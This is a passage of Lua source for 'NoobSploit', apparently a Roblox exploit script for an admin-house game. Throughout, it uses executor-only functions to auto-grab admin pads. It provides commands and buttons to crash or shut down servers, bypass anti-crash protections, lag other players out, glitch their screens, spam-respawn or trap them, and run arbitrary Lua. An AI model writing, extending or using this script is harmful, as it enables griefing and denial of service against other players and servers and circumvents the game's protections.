			data = data.."0"
		end
		if antiattach == true then
			data = data.."1"
		else
			data = data.."0"
		end
		if antivoid == true then
			data = data.."1"
		else
			data = data.."0"
		end

		return data
	end
end)

apis = {}
api_commands = {}
apis_cmdPref = {}
apis_Credits = {}
apis_Version = {}
apis_EncryptionKeys = {}

spawn(function()
	-- Mods
	-- Mods

	function hint(plr, msg)
		game.Players:Chat([[h 




]]..plr..[[: ]]..msg..[[





]])
	end

	function wifiFix()
		wait(0.1)
	end

	function CreateAPI(modApi, cmdPref, credits, version)
		local foundApi = false
		for i,v in pairs(apis) do
			if apis[i] == modApi then
				foundApi = true
			end
		end
		if foundApi == true then
			error([[-- NoobSploit mods error --
found valid API "]]..modApi..[[" please check if it exists
else report this as an error
ID #0010 (4-bit Binary Number)
-- NoobSploit mods error --]])
		elseif foundApi == false then
			table.insert(apis, modApi) -- Store API's main name
			table.insert(apis_cmdPref, cmdPref) -- Store what you use to call API
			table.insert(apis_Credits, credits) -- Store API's credits
			table.insert(apis_Version, version) -- Store API's version
			table.insert(apis_EncryptionKeys, [[0000 0000 0000 0000]]) -- Store API's version
		end
	end

	function CreateCommand(modApi, cmdPref, lowerSup, func)
		local foundApi = false
		local l = 0
		for i,v in pairs(apis) do
			if apis[i] == modApi then
				foundApi = true
				l = i
			end
		end
		if foundApi == true then
			table.insert(api_commands, apis_cmdPref[l].." "..cmdPref) -- Store command!
			game.Players.LocalPlayer.Chatted:Connect(function(msg)
				if lowerSup == true then
					if msg:lower() == prefix..apis_cmdPref[l].." "..cmdPref then
						func();
					end
				elseif lowerSup == false then
					if msg == prefix..apis_cmdPref[l].." "..cmdPref then
						func();
					end
				end
			end)
		elseif foundApi == false then
			error([[-- NoobSploit mods error --
Cant find valid API "]]..modApi..[[" please check if it exists
else report this as an error
ID #0001 (4-bit Binary Number)
-- NoobSploit mods error --]])
		end
	end
	-- Mods
	-- Mods

	wait(0.1)

	local API = "NoobSploit"
	local data = {tobinary(0), tobinary(1), tobinary(2), tobinary(3), tobinary(4), tobinary(5), tobinary(6), tobinary(7), tobinary(8), tobinary(9), tobinary(10), tobinary(11), tobinary(12), tobinary(13), tobinary(14), tobinary(15)}

	spawn(function() -- Default mod library for testing
		CreateAPI(API, "sch", "SnowClan_8342, for NoobSploit!", "v0.1")
		CreateCommand(API, "modlist", true, function() -- ;sch modlist
			print("----- API list (Info) -----")
			for i,v in pairs(apis) do
				print(apis[i].." | "..apis_Credits[i].." | "..apis_Version[i].." | "..apis_cmdPref[i])
			end
		end)
		CreateCommand(API, "reload", true, function() -- ;sch modlist
			logn("Reloading API...")
			API = nil
			data = nil

			wifiFix() -- Having some router problems so i let it rest

			API = "NoobSploit"
			data = {tobinary(0), tobinary(1), tobinary(2), tobinary(3), tobinary(4), tobinary(5), tobinary(6), tobinary(7), tobinary(8), tobinary(9), tobinary(10), tobinary(11), tobinary(12), tobinary(13), tobinary(14), tobinary(15)}
		end)
	end)
end)

spawn(function()
	while true do
		wait(5)
		for i, player in pairs(game:GetService("Players"):GetPlayers()) do
			if player.Character:FindFirstChild("VampireVanquisher") then
				if player.Character.HumanoidRootPart.Size.Y <= 0.3 then
				end
			end
		end
	end
end)

Spawn(function()
	while true do
		wait(0.05)
		if antigrayscale == true then
			if game.Workspace.CurrentCamera:FindFirstChild("GrayScale") then
				game.Workspace.CurrentCamera:FindFirstChild("GrayScale"):Destroy()
				if AllowMessages == true then
					if allowads == true then
					else
					end
				end
			end
		end

		if AntiCrash == true then
			game.Players:Chat("punish all")	
			game.Players:Chat("setgrav all inf")
			game.Players:Chat("speed all inf")
		end

		if antikill == true then
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiKill.off.BackgroundTransparency = 1
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiKill.On.BackgroundTransparency = 0	
			for q,player in pairs(game.Players:GetChildren()) do
				for i,v in pairs(Ignore) do
					if player.Name == Ignore[i] then
						if player.Character.Humanoid.Health == 0 then
							game.Players:Chat("reset "..Ignore[i])
							wait(0.2)						
						end
					end
				end
			end
		end

		if antikill == false then
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiKill.off.BackgroundTransparency = 0
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiKill.On.BackgroundTransparency = 1
		end

		if AntiGear == false then
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.off1.BackgroundTransparency = 0
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.On1.BackgroundTransparency = 1
		end

		if AntiGear == true then
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.On1.BackgroundTransparency = 0
			game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.off1.BackgroundTransparency = 1
		end

		if antijail == true then
			for i,plr in pairs(Ignore) do
				if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(plr.."'s jail") then
					game.Players:Chat("unjail "..string.sub(plr,0,4):lower())
				end
			end
		end

		if mymusiconly == true then
			if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
				if game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId == "http://www.roblox.com/asset/?id="..mymusiconly_ID then
				else
					game.Players:Chat("music "..mymusiconly_ID)
					if AllowMessages == true then
						if allowads == true then
							logn("MyMusicOnly is active")
						else
							--nothing
						end
					end
				end
			end
			if not game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
				logn("your mmoid is set to "..mymusiconly_ID)
				if AllowMessages == true then
					if allowads == true then
						game.Players:Chat("music "..mymusiconly_ID)
					else
						--also nothing
					end
				end
			end
		end
	end
end)

function start(plr)
	plr.Chatted:Connect(function(msg)
		Spawn(function()
			for i,player in pairs(Admin) do
				if plr.Name == player then
					local command = string.gsub(msg:lower(), "me", plr.Name)
					if string.sub(command, 1, 1) == ":" then
						command = ""
						game.Players:Chat("pm "..plr.Name.." your command Contains a : at the start of it, please dont.")
					elseif string.sub(command, 1, 1) == prefix then
						command = ""
						game.Players:Chat("pm "..plr.Name.." You cant use 'NoobSploitCommands class' sorry!")
					elseif string.sub(command, 1, 1) == "m" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'message' sorry!")
					elseif string.sub(command, 1, 7) == "message" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'message' sorry!")
					elseif string.sub(command, 1, 2) == "pm" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'priplratemessage' sorry!")
					elseif string.sub(command, 1, 4) == "hint" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'hint' sorry!")
					elseif string.sub(command, 1, 1) == "h" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'hint' sorry!")
					elseif string.sub(command, 1, 4) == "logs" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'logs' sorry!")
					elseif string.sub(command, 1, 4) == "cmds" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'commands' sorry!")
					elseif string.sub(command, 1, 8) == "commands" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'commands' sorry!")
					elseif string.sub(command, 1, 9) == "musiclist" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'musiclist' sorry!")
					elseif string.sub(command, 1, 11) == "packagelist" then
						game.Players:Chat("pm "..plr.Name.." You cant use 'packagelist' sorry!")
					else
						game.Players:Chat(command)
					end
				end
			end
		end)

		Spawn(function()
			for i,player in pairs(Whitelist) do
				if plr.Name == player then
					local command = string.gsub(msg:lower(), "me", plr.Name)
					if string.sub(command, 1, 1) == prefix then
						if string.sub(command, 2, 5) == "move" then
							game.Players:Chat("pm "..plr.Name.." Cant move the core player sorry!")
						else
							game.Players:Chat(command)
						end
					end
				end
			end
		end)

		Spawn(function()
			if string.sub(msg:lower(),0,8) == "unpunish" or string.sub(msg:lower(),0,9) == ":unpunish" or string.sub(msg:lower(),0,3) == "sit" or string.sub(msg:lower(),0,4) == ":sit" or string.sub(msg:lower(),0,4) == "stun" or string.sub(msg:lower(),0,5) == ":stun" then
				if antiattach == true then
					local killoff = true
					for i,ignore in pairs(Ignore) do
						if ignore[i] == plr.Name then
							killoff = false
						end
					end
					if plr.Name == game.Players.LocalPlayer.Name then
						killoff = false
					end
					if killoff == true then
						wait(0.1)
						game.Players:Chat("reset "..plr.Name)
						wait(0.1)
					end
				end
			end
		end)

		Spawn(function()
			if Superlogs == true then
				print("["..plr.Name.."]: "..msg)
			end
			if string.sub(msg,1,6) == "handes" then
				game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
					Text = "["..plr.Name..getTag().."]: "..string.sub(msg,8);
					TextStrokeTransparency = 0.75;
					Font = Enum.Font.SourceSansBold;
					Color = Color3.new(128,0,0);
					FontSize = Enum.FontSize.Size18;
				})
			end
		end)
		if msg:lower() == "logs" or msg:lower() == ":logs" then
			local player = plr.Name
			if antilogs == true then
				if player == game.Players.LocalPlayer.Name then
					game.Players:Chat("ff No antilogs for you!")
				else
					for i = 1,100 do
						game.Players:Chat(prefix.."sm Lol "..player.." tried to use logs xD!")
					end
				end
			end
		else
			if everyonecommands == true then
				if msg:lower() == "-cmds" then
					say(" -cmds -- Get commands!")
					say(" -order (plr) -- Order a drink!")
					say(" -leaderboard -- All MPS's stored")
					say(" -quote -- Grab a random quote!")
					say(" -mps -- Messages per second! get your messages per second ;)")
				elseif string.sub(msg:lower(),1,6) == "-order" then
					say(plr.Name.." just ordered "..tostring(math.random(1,5)).." "..drinks[math.random(1,#drinks)].."'s to his friend "..string.sub(msg:lower(),8))
				elseif msg:lower() == "-quote" then
					say(Quotes[math.random(1,#Quotes)])
				elseif msg:lower() == "-mps" then
					for i,v in pairs(MPS_Users) do
						if v == plr.Name then
							say("Your best MPS was "..MPS_Max[i].." (Even if no one can see the message it will still count)")
						end
					end
				elseif msg:lower() == "-leaderboard" then
					for i,v in pairs(MPS_Users) do
						say(MPS_Users[i].." Current MPS: "..MPS[i].." MPS: "..MPS_Max[i])
					end
				end
			end
		end
		found = false
		for i,v in pairs(MPS_Users) do
			if v == plr.Name then
				found = true
				MPS[i] = MPS[i] + 1
			end
		end
		if found == false then
			table.insert(MPS_Users, plr.Name)
			table.insert(MPS, 0)
			table.insert(MPS_Max, 0)
		end
	end)
end

function getTag()
	local Tag = game.Players.LocalPlayer.UserId
	Tag = string.gsub(Tag, "0", "9")
	Tag = string.gsub(Tag, "1", "8")
	Tag = string.gsub(Tag, "2", "7")
	Tag = string.gsub(Tag, "3", "6")
	Tag = string.gsub(Tag, "4", "5")
	Tag = string.gsub(Tag, "5", "4")
	Tag = string.gsub(Tag, "6", "3")
	Tag = string.gsub(Tag, "7", "2")
	Tag = string.gsub(Tag, "8", "1")
	Tag = string.gsub(Tag, "9", "0")
	return string.sub(Tag,0,4)
end

-- SirLos1
Pad_Ban = {} -- People who are banned from pads
Whitelist = {} -- Whitelisted players
Admin = {} -- People you gave temp perm

Ignore = {game.Players.LocalPlayer.Name} -- Ignored from some antis (Antiattch)

-- Self bot stuff dont edit
-- Self bot stuff dont edit
MPS_Users = {}
MPS = {}
MPS_Max = {}
-- Self bot stuff dont edit
-- Self bot stuff dont edit

drinks = {"Coke","Milk","Sprit","Cognac","Coffee","Chocolate milk","Hot Chocolate","Ice cream"}

for i,v in pairs(game.Players:GetChildren()) do
	start(v)
end

function say(msg)
	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

Spawn(function()
	while true do
		for i,v in pairs(MPS_Users) do
			if MPS[i] >= MPS_Max[i] then
				MPS_Max[i] = MPS[i]
				MPS[i] = 0
			end
		end
		wait(1)
	end
end)

Spawn(function()
	while true do
		wait(0.003)
		local CF = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		if antivoid == true then
			if CF.Y < 0 then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(CF.X, 3, CF.Z))
			end
		end
	end
end) -- Spawn 2 position CFrame.new(Vector3.new(-41, 3.7, -15.589996337891)) -28.6829948, 8.2299995, 66.4913253

Spawn(function()
	while true do

		for i,player in pairs(Pad_Ban) do
			for i,pad in pairs(Admin_Folder.Pads:GetDescendants()) do
				if pad.Name == player.."'s admin" then
					game.Players:Chat("respawn "..player)
					regen()
					wait(0.5)
					logn("Just to let you know "..player.." tried to get a pad")
					regen()
					wait(0.5)
					regen()
				end
			end
		end

		if padsEnforcement == true then
			for i,v in pairs(game.Players:GetChildren()) do
				local times = 0
				for i,pad in pairs(Admin_Folder.Pads:GetDescendants()) do
					if pad.Name == v.Name.."'s admin" then
						times = times + 1
					end
				end
				if times >= 2 then
					game.Players:Chat(prefix.."sm Pads reset because "..v.Name.." tried to take them all!")
					game.Players:Chat("respawn "..v.Name)
					game.Players:Chat("skydive "..v.Name)
					game.Players:Chat("skydive "..v.Name)
					game.Players:Chat("skydive "..v.Name)
					regen()
				end
			end
		end
		wait(0.25)
	end
end)

spawn(function()
	while true do
		wait(1)
		if NoobSploitProtectedMSG == true then
			wait(2)
			game.Players:Chat([[h   
Noob-Sploit ]]..Rank..[[


cope bro this server is protected
c o p e]])
		end
	end
end)

local lp = game.Players.LocalPlayer
local loopregentoggle = false
local loopregen = coroutine.create(function()
	while true do game:GetService'RunService'.Heartbeat:Wait()
		firedclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin:WaitForChild('Regen').ClickDetector, 0)
	end
	if not loopregentoggle then coroutine.yield() end
end)

local perm = {}
local permtoggles = {}
local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads
for i,ass in pairs(pads:GetChildren()) do
	permtoggles[i] = false
	perm[i] = coroutine.create(function()
		while true do
			local suc,er = pcall(function()
				firetouchinterest(lp.Character.Head, ass.Head, 1)
				firetouchinterest(lp.Character.Head, ass.Head, 0)
			end)
			if not suc then print(er) end
			game:GetService'RunService'.Heartbeat:Wait()
			if not permtoggles[i] then coroutine.yield() end
		end
	end)
end
pads.ChildAdded:Connect(function(ass)
	permtoggles[i] = false
	perm[i] = coroutine.create(function()
		while true do
			local suc,er = pcall(function()
				firetouchinterest(lp.Character.Head, ass.Head, 1)
				firetouchinterest(lp.Character.Head, ass.Head, 0)
			end)
			if not suc then print(er) end
			game:GetService'RunService'.Heartbeat:Wait()
			if not permtoggles[i] then coroutine.yield() end
		end
	end)
end)




lp.Chatted:Connect(function(msg)
	local args = msg:split(' ')
	if args[1]:lower():sub(1, 1) ~= '.' then return else args[1] = args[1]:lower():sub(2) end
	if args[1] == 'loopgrab' then
		local suc,er = pcall(function()
			permtoggles[tonumber(args[2])] = true
			fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
			coroutine.resume(perm[tonumber(args[2])])
		end)
		if not suc then print(er) end
	elseif args[1] == 'unloopgrab' then
		local suc,er = pcall(function()
			permtoggles[tonumber(args[2])] = false
			--
			wait(0.1)
			fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
		end)
		if not suc then print(er) end
	elseif args[1] == 'loopregen' then
		loopregentoggle = true
		coroutine.resume(loopregen)
	elseif args[1] == 'unloopregen' then
		loopregentoggle = false
	end
end)

	if uidata.startupcmdsenabled then
		for i,v in pairs(uidata.startupcmds) do
			plrs:Chat(v)
		end
	end

addcmd('---Having Perm and Persons admin is recommended---')
addcmd(prefix..'sunrise -Makes a sunrise on the map')
addcmd(prefix..'sunset -Makes a sunset on the map')
addcmd(prefix..'dark -Makes the map dark')
addcmd(prefix..'btools user -gives user btools this is client sided')
addcmd(prefix..'spam command -spams a command until .stopped')
addcmd(prefix..'stop -stops what ever you were spamming/doing')
addcmd(prefix..'super commmand -fast way to clearlogs or to send 100 messages')
addcmd(prefix..'pads -teleports you to pads')
addcmd(prefix..'prefix -changes your prefix to whatever you put')
addcmd(prefix..'crash -Crashes with size vampire crash')
addcmd(prefix..'anticrash -spams size all 10 to prevent a lot of crashs')
addcmd(prefix..'sshutdown -shutdowns the server without advertising')
addcmd(prefix..'regen -regens admin pad if the regen pad is in workspace')
addcmd(prefix..'bok user -removes users ability to interact with touch interactions')
addcmd(prefix..'trap user -traps user from moving')
addcmd(prefix..'perm -makes you auto collect a pad')
addcmd(prefix..'nonperm -removes .perms effects')
addcmd(prefix..'attach -attachs using stun punish unpunish')
addcmd(prefix..'boombox user -gives user boombox')
addcmd(prefix..'ds -gives you dancing sword hats DOES NOT INJECT THE SCRIPT ')
addcmd(prefix..'movepads -moves admin pads into the sky')
addcmd(prefix..'movehouse -moves house into the sky')
addcmd(prefix..'moveobbybox -moves spawns obby box into the sky')
addcmd(prefix..'moveadmindividers -moves the dividers next to the admin pads into the sky')
addcmd(prefix..'moveresetpad -moves admin regen pad into the sky')
addcmd(prefix..'moveobbybricks -moves obby bricked funny NOT A BUG A SWEAR')
addcmd(prefix..'nok -removes touch interations with the obby bricks')
addcmd(prefix..'movebuildingbricks -moves the building btricks |cant move 2 idk why|')
addcmd(prefix..'wkick user -makes everybodys ping go up pretty much kicking the user')
addcmd(prefix..'disablerc -disables right click and any new users forces them to shiftlock')
addcmd(prefix..'setspawnpoints user -moves spawn points to where you were when you ran it')
addcmd(prefix..'allpads -collects all pads')
addcmd(prefix..'lua code -runs lua example: .lua game:shutdown()')
addcmd(prefix..'rejoin -rejoins the server you are in')
addcmd(prefix..'findresetpad -find admin regen pad if its in the workspace')
addcmd(prefix..'rockert user -makes a user rocket up |works without persons admin|')
addcmd(prefix..'rrocket user -makes user rocket up but rainbow |works without persons|')
addcmd(prefix..'movebaseplate -moves baseplate into the sky')
addcmd(prefix..'alltools -equip all tools at the same time')
addcmd(prefix..'padban -bans player from pads')
addcmd(prefix..'gearban user --bans user from using gears')
addcmd(prefix..'')
addcmd('---NoobSploit Exclusive---')
addcmd(prefix..'cb -crash bypass bypasses a ton of anticrashs but is a little slow')
addcmd(prefix..'sus -sus')
addcmd(prefix..'wlcmds -displays whitelisted users commands |may not be up to date|')
addcmd(prefix..'remix -plays a remix')
addcmd(prefix..'cherry -my friend made this command :D')
addcmd(prefix..'bacon user -turns user into bacon')
addcmd(prefix..'random user -turns them into a char that switchs there avatar a lot')
addcmd(prefix..'nochat -removes chat UI and lags some users games')
addcmd(prefix..'lagout -REQUIRES PERSONS ADMIN do not run if your on a bad pc you will probable crash')
addcmd(prefix..'loopgrab all -loop grabs all the pads when reset')
addcmd(prefix..'unloopgrab all -undoes loopgrab alls effects')
addcmd(prefix..'annoy user -spam respawns a user')
addcmd(prefix..'antipunish -cope you cant turn this off :troll:')
addcmd(prefix..'boobs -:flushed:')
addcmd(prefix..'bts -BEST BOY BAND ON EARTH')
addcmd(prefix..'clearchat -clears chat with unicode')
addcmd(prefix..'scrash -silent crash')
addcmd(prefix..'theme1-2 -Used from noobcmds to carry on there script :salute:')
addcmd(prefix..'fcrash -this is a fake crash and only freezes the server for about 1 min max')
addcmd(prefix..'antigear on -turns on antigears')
addcmd(prefix..'antigear off -turns off antigears')
addcmd(prefix..'forcecrash -should bypass most of all anticrashes')
addcmd(prefix..'clearchat -clears chat using unicode')
addcmd(prefix..'roblox -roblox')
addcmd(prefix..'fix -removes all effects from lighting')
addcmd(prefix..'anticrash on -idfk games dead i tried')
addcmd(prefix..'anticrash off -turns off anticrash')
addcmd(prefix..'vis on -turns visualizer on')
addcmd(prefix..'vis off -turns visualizer off')
addcmd(prefix..'glitch plr -glitches players screen')
addcmd(prefix..'check -checks if there are any users with anti VG enabled [Disables AntiGears]')




addMusic('Heart Afire - Defqwop suggested by: Yikes.exe#1603', 3354340607)
addMusic('Better Off Alone', 5014057599)
addMusic('M.U.L.E.', 6526664585)
addMusic('Uptown', 1845554017)
addMusic('Cursed Abbey by Gravity', 411946428)
addMusic('The Turtles Happy Together', 6950127531)
addMusic('Hey Ya', 6969198609)
addMusic('Vaporwave', 1650786609)
addMusic('Just The Two Of Us', 4598531684)
addMusic('pom pom', 4987310147)
addMusic('old roblox music', 6401841655)
addMusic('Dinner Is Not Gone', 5087933569)
addMusic('Disconnected', 198403839)
addMusic('Chad', 6520777243)
addMusic('Da Vincis Notebook - Enormous PP', 5846134019)
addMusic('The Villain I Appear to be (Diamond Jack)', 1245737020)
addMusic('swag music', 442860930)
addMusic('Oh Klahoma', 4574949047)
addMusic('Driving Synths', 1839823098)
addMusic('FinalRainbow', 276740455)
addMusic('Motherboard', 276741165)
addMusic('Blanklevels', 276740207)
addMusic('Frontier Justice - Dapper Dog',315205728)
addMusic('Gourmet Race (Beta Mix) - Kirby Super Star',6200441882)
addMusic('Stronger Than You In Spanish',6051700940)
addMusic('Howls Moving Castle',5334601768)
addMusic('Beat Your Competition - Vibe tracks',364319796)
addMusic('BeatBox -Breaches',7609050584)
addMusic('Tokyo Machine - EPIC',5410085694)
addMusic('Mice On Venus but make it E X T R A nostalgic',6586644821)
addMusic('Glory to CCP',7252116131)
addMusic('Coconut Ranger',1849099489)
addMusic('Dead Weight',4657857001)
addMusic('Cheeseburger Family',2542847636)
addMusic('Baby hotline',6982843231)
addMusic('KeyMan',2822219524)
addMusic('InchMan',1895754613)
addMusic('chill music',5410084268)
addMusic('Two Time',1674203484)
addMusic('piano', 1835719159)
addMusic('pirate theme', 1157553123)
addMusic('game:shutdown() :troll:', 3732975081)
addMusic('pepermint',1804162388)
addMusic('Fighter',5440290690)
addMusic('Msled',3820057975)
addMusic('windrag',5064044026)
addMusic('The girl next door',7056784561)


addButton('Shaders', function(self)
	local light = game.Lighting
	for i, v in pairs(light:GetChildren()) do
		v:Destroy()
	end

	local ter = workspace.Terrain
	local color = Instance.new("ColorCorrectionEffect")
	local bloom = Instance.new("BloomEffect")
	local sun = Instance.new("SunRaysEffect")
	local blur = Instance.new("BlurEffect")

	color.Parent = light
	bloom.Parent = light
	sun.Parent = light
	blur.Parent = light


	local config = {

		Terrain = true;
		ColorCorrection = true;
		Sun = true;
		Lighting = true;
		BloomEffect = true;

	}


	color.Enabled = true
	color.Contrast = 0.15
	color.Brightness = 0.1
	color.Saturation = 0.25
	color.TintColor = Color3.fromRGB(255, 222, 211)

	bloom.Enabled = true
	bloom.Intensity = 0.3

	sun.Enabled = true
	sun.Intensity = 0.5
	sun.Spread = 5

	bloom.Enabled = true
	bloom.Intensity = 0.05
	bloom.Size = 32
	bloom.Threshold = 1

	blur.Enabled = true
	blur.Size = 2



	if config.ColorCorrection then
		color.Enabled = true
	end


	if config.Sun then
		sun.Enabled = true
	end


	if config.Terrain then
		ter.WaterColor = Color3.fromRGB(10, 10, 24)
		ter.WaterWaveSize = 0.1
		ter.WaterWaveSpeed = 22
		ter.WaterTransparency = 0.9
		ter.WaterReflectance = 0.05
	end


	if config.Lighting then
		light.Ambient = Color3.fromRGB(12, 31, 42)
		light.Brightness = 4.5
		light.ColorShift_Bottom = Color3.fromRGB(12, 31, 42)
		light.ColorShift_Top = Color3.fromRGB(12, 31, 42)
		light.ExposureCompensation = 0
		light.FogColor = Color3.fromRGB(132, 132, 132)
		light.GlobalShadows = true
		light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
		light.Outlines = false
	end
end)


addButton('Regen', function(self)
	fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
end)


addButton('Print Credits', function(self)
	if self.Text ~= 'Print Credits' then return end
	print('Credits for NoobSploit')
	print('GlobalConsole for starting the idea')
	print('IShade4ReaI / Shade4Real#8929 for helping me script and for making the gui')
	print('Eo8q / TheKillerCrum#1930 for getting me into scripting in the first place and for helping me script')
	print('Mikucut for being the base of this')
	print('And all the beta testers that beta tested before version 2')
	print('Roblox moderation because why not it sucks')
	logn('check F9 for printed credits')
	self.Text = 'Printed Credits'
	wait(2)
	self.Text = 'Print Credits'
end)

addButton('China Man', function(self)
	game.Players:Chat("size all nan")
	wait(0.1)
	game.Players:Chat("undog all")
	wait(0.1)
	game.Players:Chat("music 7252116131")
end)

addButton('Delete Admin Pads', function(self)
	if Stable_Check == false then
		logn("{Move.lua} Moving Admin Pads")
		Stable_Check = true
		for i, v in pairs(Admin_Folder.Pads:GetDescendants()) do
			if v.Name == "Head" then
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.5)
					looping = false
					game.Players:Chat(prefix.."25 skydive me")
					wait(0.4)
					game.Players:Chat("respawn me")
					wait(0.2)
				end
			end
		end
		wait(0.5)
		Stable_Check = false
		logn("{Move.lua} Done Moving Admin Pads")
		game.Players:Chat(prefix.."rejoin")
	else
		logn("{Move.lua} Already Moving, Please Wait")
	end
end)

addButton('Delete Regen Pad', function(self)
	if Stable_Check == false then
		logn("{Move.lua} Deleting Regen Pad")
		Stable_Check = true
		if Admin_Folder.Regen.CFrame.Y < 500 then
			repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
			local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			local looping = true
			spawn(function()
				while true do
					game:GetService('RunService').Heartbeat:Wait()
					game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
					cf.CFrame = Admin_Folder.Regen.CFrame * CFrame.new(-1*(Admin_Folder.Regen.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
					if not looping then break end
				end
			end)
			spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
			wait(0.3)
			looping = false
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			wait(0.1)
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			wait(0.1)
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			game.Players:Chat("skydive me")
			wait(0.5)
			game.Players:Chat(".rejoin")
		end
		wait(0.5)
		Stable_Check = false
		logn("{Move.lua} pad went bye bye")
	else
		logn("{Move.lua} stop its already being deleted")
	end
end)

addButton('Shutdown Server', function(self)
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("freeze all")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("clone all")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("freeze all")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("clone all")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("freeze all")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("clone all")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("size all 0.3")
	game.Players:Chat("freeze all")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("size all 10")
	game.Players:Chat("clone all")
end)

addButton('Giant Yourself', function(self)
	game.Players:Chat("skydive me")
	game.Players:Chat("size me .3")
	game.Players:Chat("size me .3")
	game.Players:Chat("size me 10")
	game.Players:Chat("size me 10")
	game.Players:Chat("size me 10")
end)

addButton('Kill All', function(self)
	game.Players:Chat('kill all')
end)

addButton('All pads', function(self)
	local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
	for i, pad in pairs(pads) do
		Spawn(function()
			pad.PrimaryPart = pad:FindFirstChild("Head")
			local pos = pad.PrimaryPart.CFrame
			wait(0)
			pad.PrimaryPart.CanCollide = false
			pad:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
			wait(0)
			pad:SetPrimaryPartCFrame(pos)
			pad.PrimaryPart.CanCollide = false
			pad.PrimaryPart.Transparency = 0
		end)
		pad.PrimaryPart.Transparency = 1
	end
end)

addButton('Skydive', function(self)
	logn("Skydived!")
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 1500, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z))
end)

addButton('UnSkydive', function(self)
